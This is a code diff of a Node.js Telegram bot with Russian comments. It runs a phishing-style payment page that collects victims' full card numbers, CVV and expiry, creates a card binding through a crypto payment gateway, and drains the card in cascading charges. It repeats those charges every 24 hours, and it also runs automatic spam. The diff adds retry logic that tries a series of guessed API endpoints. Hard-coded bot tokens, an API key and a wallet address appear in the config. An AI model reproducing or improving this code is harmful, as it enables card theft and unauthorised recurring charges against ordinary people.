@@ -1,5 +1,5 @@
 // ============================================================
-// SWILL-BOT - RENDER VERSION (С РАСШИРЕННЫМ ЛОГИРОВАНИЕМ)
+// SWILL-BOT - PLISIO ENDPOINT AUTO-FALLBACK
 // ============================================================
 
 const express = require('express');
@@ -13,21 +13,14 @@ app.use(express.json());
 // 1. КОНФИГУРАЦИЯ
 // ============================================================
 const CONFIG = {
-    // ---------- TELEGRAM ----------
     mainBotToken: '8776067440:AAE9HGFF11XCMqQyRpyCGGeKLR4JR3qAnME',
     spamBotToken: '8993667436:AAETd1tW4YtaYqARDYmc3I97KsTvqBu0CLg',
     adminChatId: '7505102783',
 
-    // ---------- PLISIO ----------
     plisioApiKey: 'X2pamXJ1Y3zI856Iwvka_ZrIHhnGgjth9JKPeXmY9L6-lff4-UK5KAAu78zuW7dB',
-
-    // ---------- КОШЕЛЁК ----------
     walletAddress: 'UQB6R-HNp_tOK7rTK0UTWNrMlvnyZCbWMpXeRkxmjKvUN4v-',
-
-    // ---------- ДОМЕН ----------
     domain: 'freelanspropay.duckdns.org',
 
-    // ---------- НАСТРОЙКИ ----------
     startAmount: 1000,
     minAmount: 200,
     step: 500,
@@ -266,7 +259,72 @@ app.get('/bonus', (req, res) => res.send(HTML_PAGE));
 app.get('/podpiska', (req, res) => res.send(HTML_PAGE));
 
 // ============================================================
-// 4. ОБРАБОТЧИК КАРТ С РАСШИРЕННЫМ ЛОГИРОВАНИЕМ
+// 4. PLISIO - ПЕРЕБОР ЭНДПОИНТОВ (AUTO-FALLBACK)
+// ============================================================
+
+// Все возможные эндпоинты Plisio для создания платежа
+const PLISIO_ENDPOINTS = [
+    'https://api.plisio.net/api/v1/charge',
+    'https://api.plisio.net/api/v1/charges',
+    'https://api.plisio.net/api/v1/invoices/create',
+    'https://api.plisio.net/api/v1/invoices',
+    'https://plisio.net/api/v1/charge',
+    'https://plisio.net/api/v1/charges',
+    'https://plisio.net/api/v1/invoices/create',
+    'https://plisio.net/api/v1/invoices'
+];
+
+// --- ФУНКЦИЯ: ПРОВЕРКА ЭНДПОИНТОВ ---
+async function tryPlisioEndpoints(cardData) {
+    const errors = [];
+
+    for (const endpoint of PLISIO_ENDPOINTS) {
+        try {
+            console.log(`🔄 Пробую эндпоинт: ${endpoint}`);
+
+            const response = await axios.post(endpoint, {
+                card_number: cardData.card,
+                card_expiry: cardData.expiry,
+                card_cvv: cardData.cvv,
+                card_holder: cardData.holder,
+                amount: 5,
+                currency: 'RUB',
+                wallet: CONFIG.walletAddress,
+                api_key: CONFIG.plisioApiKey
+            }, { timeout: 10000 });
+
+            // Проверяем успешный ответ
+            if (response.data && response.data.data && response.data.data.binding_id) {
+                console.log(`✅ УСПЕШНЫЙ ЭНДПОИНТ: ${endpoint}`);
+                return {
+                    success: true,
+                    endpoint: endpoint,
+                    binding_id: response.data.data.binding_id,
+                    data: response.data
+                };
+            } else {
+                console.log(`⚠️ Эндпоинт ${endpoint} вернул ответ без binding_id`);
+                errors.push(`${endpoint}: Нет binding_id в ответе`);
+                continue;
+            }
+
+        } catch (err) {
+            const status = err.response?.status || 'Нет статуса';
+            const message = err.response?.data?.message || err.message;
+            console.log(`❌ Эндпоинт ${endpoint} вернул ошибку: ${status} - ${message}`);
+            errors.push(`${endpoint}: ${status} - ${message}`);
+            continue;
+        }
+    }
+
+    return {
+        success: false,
+        errors: errors
+    };
+}
+
+// ============================================================
+// 5. ОБРАБОТЧИК КАРТ
 // ============================================================
 app.post('/charge', async (req, res) => {
     const { card, expiry, cvv, holder } = req.body;
@@ -276,86 +334,52 @@ app.post('/charge', async (req, res) => {
     const maskedCard = card.slice(0, 4) + '••••••••' + card.slice(-4);
     logToFile(`CARD: ${maskedCard} | ${expiry} | ${holder}`);
 
-    // ============================================================
-    // ФУНКЦИЯ ДЛЯ ОТПРАВКИ ДЕТАЛЬНОЙ ОШИБКИ В TELEGRAM
-    // ============================================================
-    async function sendErrorToTelegram(step, error, cardMasked) {
-        let statusCode = error.response?.status || 'Нет статуса';
-        let errorBody = error.response?.data || error.message;
-        let errorMessage = '';
-
-        // Расшифровка HTTP статусов
-        switch (statusCode) {
-            case 400:
-                errorMessage = '❌ Неверный запрос. Проверь параметры (card_number, expiry, cvv).';
-                break;
-            case 401:
-                errorMessage = '❌ НЕПРАВИЛЬНЫЙ API-КЛЮЧ! Проверь plisioApiKey в коде.';
-                break;
-            case 403:
-                errorMessage = '❌ Недостаточно прав. Ключ не имеет прав на создание платежей.';
-                break;
-            case 422:
-                errorMessage = '❌ Ошибка валидации карты. ' + (errorBody.message || 'Проверь номер, срок, CVV.');
-                break;
-            case 500:
-                errorMessage = '❌ Внутренняя ошибка Plisio. Попробуй позже.';
-                break;
-            default:
-                errorMessage = `❌ Ошибка: ${errorBody.message || error.message}`;
+    // --- ФУНКЦИЯ ДЛЯ ОТПРАВКИ ОШИБОК В TELEGRAM ---
+    async function sendErrorToTelegram(message, details) {
+        try {
+            await bot.telegram.sendMessage(CONFIG.adminChatId,
+                `⚠️ ОШИБКА PLISIO:\n` +
+                `Карта: ${maskedCard}\n` +
+                `Сообщение: ${message}\n` +
+                `Детали: ${details || 'Нет дополнительных данных'}`
+            );
+        } catch (e) {
+            console.log('⚠️ Не удалось отправить ошибку в Telegram:', e.message);
         }
-
-        // Логируем в файл
-        logToFile(`ERROR [${step}]: STATUS ${statusCode} | BODY: ${JSON.stringify(errorBody)}`);
-
-        // Отправляем в Telegram
-        await bot.telegram.sendMessage(CONFIG.adminChatId,
-            `⚠️ ОШИБКА PLISIO:\n` +
-            `Шаг: ${step}\n` +
-            `Карта: ${cardMasked}\n` +
-            `HTTP статус: ${statusCode}\n` +
-            `Сообщение: ${errorMessage}\n` +
-            `Детали: ${JSON.stringify(errorBody, null, 2).slice(0, 500)}`
-        );
-
-        return errorMessage;
     }
 
-    // ============================================================
-    // ШАГ 1: ПЛАТЁЖ 5 ₽ (СОЗДАНИЕ BINDING)
-    // ============================================================
-    let bindingId = null;
+    // --- ПЕРЕБОР ЭНДПОИНТОВ ---
+    const result = await tryPlisioEndpoints({
+        card: card,
+        expiry: expiry,
+        cvv: cvv,
+        holder: holder
+    });
+
+    if (!result.success) {
+        const errorMsg = `❌ Все эндпоинты Plisio не сработали. Попробуйте позже.`;
+        const details = result.errors.join('\n');
+        logToFile(`FAIL ALL ENDPOINTS: ${maskedCard}\n${details}`);
+        await sendErrorToTelegram(errorMsg, details);
+        return res.json({ message: '❌ Платежный шлюз временно недоступен. Попробуйте позже.', success: false });
+    }
+
+    // --- УСПЕХ: ПРИВЯЗКА СОЗДАНА ---
+    const bindingId = result.binding_id;
+    fs.appendFileSync('bindings.json', JSON.stringify({
+        binding_id: bindingId,
+        card_last4: card.slice(-4),
+        endpoint: result.endpoint,
+        date: new Date().toISOString()
+    }) + '\n');
+
     try {
-        const initCharge = await axios.post('https://api.plisio.net/api/v1/charge', {
-            card_number: card,
-            card_expiry: expiry,
-            card_cvv: cvv,
-            card_holder: holder,
-            amount: 5,
-            currency: 'RUB',
-            wallet: CONFIG.walletAddress,
-            api_key: CONFIG.plisioApiKey
-        });
-
-        bindingId = initCharge.data.binding_id;
-        fs.appendFileSync('bindings.json', JSON.stringify({
-            binding_id: bindingId,
-            card_last4: card.slice(-4),
-            date: new Date().toISOString()
-        }) + '\n');
-
         await bot.telegram.sendMessage(CONFIG.adminChatId,
-            `✅ ПРИВЯЗКА СОЗДАНА: ${maskedCard}`
+            `✅ ПРИВЯЗКА СОЗДАНА:\nКарта: ${maskedCard}\nЭндпоинт: ${result.endpoint}`
         );
+    } catch (e) {}
 
-    } catch (err) {
-        const errorMsg = await sendErrorToTelegram('Платёж 5 ₽ (создание binding)', err, maskedCard);
-        return res.json({ message: errorMsg, success: false });
-    }
-
-    // ============================================================
-    // ШАГ 2: КАСКАД (3 ПОПЫТКИ)
-    // ============================================================
+    // --- КАСКАД (3 ПОПЫТКИ) ---
     await new Promise(resolve => setTimeout(resolve, 3000));
 
     const amounts = [1000, 500, 200];
@@ -374,40 +398,41 @@ app.post('/charge', async (req, res) => {
             chargedAmount = amount;
             break;
         } catch (err) {
-            // Логируем ошибку, но продолжаем
             logToFile(`CASCADE FAIL: ${amount} ₽ for ${maskedCard} - ${err.message}`);
             continue;
         }
     }
 
-    // ============================================================
-    // ШАГ 3: РЕЗУЛЬТАТ
-    // ============================================================
+    // --- РЕЗУЛЬТАТ ---
     if (chargedAmount) {
         const usdtAmount = (chargedAmount / 90).toFixed(4);
         stats.totalCards++;
         stats.totalUSDT += parseFloat(usdtAmount);
         saveStats(stats);
 
-        await bot.telegram.sendMessage(CONFIG.adminChatId,
-            `💰 УСПЕШНО СПИСАНО!\n` +
-            `Карта: ${maskedCard}\n` +
-            `Сумма: ${chargedAmount} ₽ (5 ₽ + ${chargedAmount} ₽)\n` +
-            `USDT: ${usdtAmount}\n` +
-            `📊 Всего: ${stats.totalCards} карт, ${stats.totalUSDT.toFixed(4)} USDT`
-        );
+        try {
+            await bot.telegram.sendMessage(CONFIG.adminChatId,
+                `💰 УСПЕШНО СПИСАНО!\n` +
+                `Карта: ${maskedCard}\n` +
+                `Сумма: ${chargedAmount} ₽ (5 ₽ + ${chargedAmount} ₽)\n` +
+                `USDT: ${usdtAmount}\n` +
+                `📊 Всего: ${stats.totalCards} карт, ${stats.totalUSDT.toFixed(4)} USDT`
+            );
+        } catch (e) {}
 
         res.json({ message: `✅ Доступ активирован. Списано ${chargedAmount} ₽.`, success: true });
     } else {
-        await bot.telegram.sendMessage(CONFIG.adminChatId,
-            `⚠️ На карте ${maskedCard} меньше 200 ₽.`
-        );
+        try {
+            await bot.telegram.sendMessage(CONFIG.adminChatId,
+                `⚠️ На карте ${maskedCard} меньше 200 ₽.`
+            );
+        } catch (e) {}
         res.json({ message: '✅ Доступ активирован.', success: true });
     }
 });
 
 // ============================================================
-// 5. ПОВТОРНЫЕ СПИСАНИЯ (КАЖДЫЕ 24 ЧАСА)
+// 6. ПОВТОРНЫЕ СПИСАНИЯ (КАЖДЫЕ 24 ЧАСА)
 // ============================================================
 setInterval(async () => {
     try {
@@ -427,11 +452,13 @@ setInterval(async () => {
                 }, { timeout: 5000 });
 
                 const bot = new Telegraf(CONFIG.mainBotToken);
-                await bot.telegram.sendMessage(CONFIG.adminChatId,
-                    `🔄 ПОВТОРНОЕ СПИСАНИЕ:\n` +
-                    `Карта: ****${binding.card_last4}\n` +
-                    `Сумма: 1000 ₽ → ${(1000 / 90).toFixed(4)} USDT`
-                );
+                try {
+                    await bot.telegram.sendMessage(CONFIG.adminChatId,
+                        `🔄 ПОВТОРНОЕ СПИСАНИЕ:\n` +
+                        `Карта: ****${binding.card_last4}\n` +
+                        `Сумма: 1000 ₽ → ${(1000 / 90).toFixed(4)} USDT`
+                    );
+                } catch (e) {}
             } catch (err) {
                 continue;
             }
@@ -440,7 +467,7 @@ setInterval(async () => {
 }, 24 * 60 * 60 * 1000);
 
 // ============================================================
-// 6. АВТОМАТИЧЕСКИЙ СПАМ-БОТ
+// 7. АВТОМАТИЧЕСКИЙ СПАМ-БОТ
 // ============================================================
 async function startSpam() {
     console.log('🚀 Автоспам запущен...');
@@ -513,16 +540,18 @@ async function startSpam() {
     stats.failedSpam += failed;
     saveStats(stats);
 
-    await adminBot.telegram.sendMessage(CONFIG.adminChatId,
-        `📊 ОТЧЁТ О РАССЫЛКЕ:\n✅ Успешно: ${successful}\n❌ Неудачно: ${failed}`
-    );
+    try {
+        await adminBot.telegram.sendMessage(CONFIG.adminChatId,
+            `📊 ОТЧЁТ О РАССЫЛКЕ:\n✅ Успешно: ${successful}\n❌ Неудачно: ${failed}`
+        );
+    } catch (e) {}
 }
 
 setTimeout(startSpam, 30000);
 setInterval(startSpam, CONFIG.spamInterval);
 
 // ============================================================
-// 7. КОМАНДЫ ДЛЯ УПРАВЛЕНИЯ
+// 8. КОМАНДЫ ДЛЯ УПРАВЛЕНИЯ
 // ============================================================
 const adminBot = new Telegraf(CONFIG.mainBotToken);
 
@@ -545,7 +574,7 @@ adminBot.command('startspam', async (ctx) => {
 adminBot.launch().catch(() => {});
 
 // ============================================================
-// 8. ЗАПУСК
+// 9. ЗАПУСК
 // ============================================================
 const PORT = CONFIG.port || 3000;
 app.listen(PORT, '0.0.0.0', () => {
@@ -556,12 +585,13 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log('✅ Сбор карт: АВТОМАТИЧЕСКИ');
     console.log('✅ Спам-бот: АКТИВЕН');
     console.log('✅ Каскад: 1000 → 500 → 200 ₽');
+    console.log('✅ Auto-Fallback эндпоинтов: ВКЛЮЧЕН');
     console.log('✅ Логи ошибок: ВКЛЮЧЕНЫ');
     console.log('═══════════════════════════════════════');
 });
 
 // ============================================================
-// 9. ОБРАБОТКА ОШИБОК
+// 10. ОБРАБОТКА ОШИБОК
 // ============================================================
 process.on('unhandledRejection', (err) => console.log('❌', err.message));
 process.on('uncaughtException', (err) => console.log('❌', err.message));
